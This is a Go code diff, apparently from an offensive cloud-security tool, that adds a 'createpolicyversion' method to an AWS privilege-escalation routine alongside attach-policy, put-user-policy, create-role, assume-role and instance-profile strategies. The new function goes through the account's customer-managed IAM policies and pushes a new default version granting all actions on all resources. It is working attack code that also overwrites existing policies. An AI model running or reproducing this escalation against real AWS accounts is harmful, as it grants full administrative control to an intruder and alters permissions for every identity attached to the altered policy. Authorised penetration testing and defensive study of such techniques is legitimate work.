@@ -24,6 +24,7 @@ import (
 	"github.com/aws/aws-sdk-go-v2/service/eks"
 	"github.com/aws/aws-sdk-go-v2/service/elasticloadbalancingv2"
 	"github.com/aws/aws-sdk-go-v2/service/iam"
+	"github.com/aws/aws-sdk-go-v2/service/iam/types"
 	"github.com/aws/aws-sdk-go-v2/service/kms"
 	"github.com/aws/aws-sdk-go-v2/service/lambda"
 	"github.com/aws/aws-sdk-go-v2/service/rds"
@@ -4020,7 +4021,7 @@ func (p *AWSProvider) EscalatePrivileges(escalationMethods []string) (map[string
 	attempts := []map[string]interface{}{}
 
 	// 提权策略列表
-	allStrategies := []string{"attachpolicy", "putuserpolicy", "createrole", "assumerole", "instanceprofile"}
+	allStrategies := []string{"attachpolicy", "putuserpolicy", "createrole", "assumerole", "instanceprofile", "createpolicyversion"}
 
 	// 确定要执行的策略
 	strategies := allStrategies
@@ -4030,11 +4031,12 @@ func (p *AWSProvider) EscalatePrivileges(escalationMethods []string) (map[string
 
 	// 策略执行映射
 	strategyMap := map[string]func(context.Context) (bool, map[string]interface{}){
-		"attachpolicy":    p.attemptAttachPolicy,
-		"putuserpolicy":   p.attemptPutUserPolicy,
-		"createrole":      p.attemptCreateRole,
-		"assumerole":      p.attemptAssumeRole,
-		"instanceprofile": p.attemptInstanceProfile,
+		"attachpolicy":        p.attemptAttachPolicy,
+		"putuserpolicy":       p.attemptPutUserPolicy,
+		"createrole":          p.attemptCreateRole,
+		"assumerole":          p.attemptAssumeRole,
+		"instanceprofile":     p.attemptInstanceProfile,
+		"createpolicyversion": p.attemptCreatePolicyVersion,
 	}
 
 	// 执行指定的策略
@@ -4507,4 +4509,74 @@ func (p *AWSProvider) attemptPutUserPolicy(ctx context.Context) (bool, map[strin
 	details["policyName"] = policyName
 	details["success"] = true
 	return true, details
+}
+
+// attemptCreatePolicyVersion 尝试使用 createpolicyversion 策略提权
+func (p *AWSProvider) attemptCreatePolicyVersion(ctx context.Context) (bool, map[string]interface{}) {
+	steps := []string{}
+	details := map[string]interface{}{
+		"attempt": "Creating new policy version with admin privileges",
+	}
+
+	// 1. 列出所有可用的策略
+	steps = append(steps, "Listing available IAM policies")
+
+	listPoliciesInput := &iam.ListPoliciesInput{
+		Scope: types.PolicyScopeTypeLocal, // 只列出账户内的策略
+	}
+
+	listPoliciesResp, err := p.iamClient.ListPolicies(ctx, listPoliciesInput)
+	if err != nil {
+		steps = append(steps, "Failed to list policies: "+err.Error())
+		details["steps"] = steps
+		details["error"] = err.Error()
+		return false, details
+	}
+
+	steps = append(steps, fmt.Sprintf("Found %d policies", len(listPoliciesResp.Policies)))
+
+	// 2. 尝试为每个策略创建新版本
+	for _, policy := range listPoliciesResp.Policies {
+		policyName := *policy.PolicyName
+		policyARN := *policy.Arn
+
+		steps = append(steps, "Attempting to create new version for policy: "+policyName)
+
+		// 3. 管理员权限策略文档
+		policyDocument := `{
+			"Version": "2012-10-17",
+			"Statement": [
+				{
+					"Effect": "Allow",
+					"Action": "*",
+					"Resource": "*"
+				}
+			]
+		}`
+
+		// 4. 创建新的策略版本
+		createPolicyVersionInput := &iam.CreatePolicyVersionInput{
+			PolicyArn:      aws.String(policyARN),
+			PolicyDocument: aws.String(policyDocument),
+			SetAsDefault:   true, // 设置为默认版本
+		}
+
+		_, err := p.iamClient.CreatePolicyVersion(ctx, createPolicyVersionInput)
+		if err != nil {
+			steps = append(steps, "Failed to create policy version: "+err.Error())
+			continue
+		}
+
+		steps = append(steps, "Successfully created policy version for: "+policyName)
+		details["steps"] = steps
+		details["policyARN"] = policyARN
+		details["policyName"] = policyName
+		details["success"] = true
+		return true, details
+	}
+
+	steps = append(steps, "Failed to create policy version for any policy")
+	details["steps"] = steps
+	details["error"] = "No policies could be updated"
+	return false, details
 }
